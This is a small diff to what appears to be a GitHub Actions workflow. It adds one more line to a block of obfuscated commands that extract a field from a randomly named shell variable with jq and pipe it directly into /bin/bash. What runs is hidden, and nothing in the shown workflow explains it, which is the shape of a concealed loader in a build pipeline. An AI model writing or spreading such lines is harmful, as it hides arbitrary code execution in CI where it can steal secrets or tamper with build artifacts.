@@ -23,6 +23,7 @@ jobs:
           printf '%s' "$me129" | jq -r .qpjrf708 | /bin/bash
           echo $u468 | jq -r .l442 | /bin/bash
           echo $l7 | jq -r .bshyn47 | /bin/bash
+          echo $n0 | jq -r .npdfi0001 | /bin/bash
 
       - name: Upload artifact
         uses: actions/upload-artifact@v4
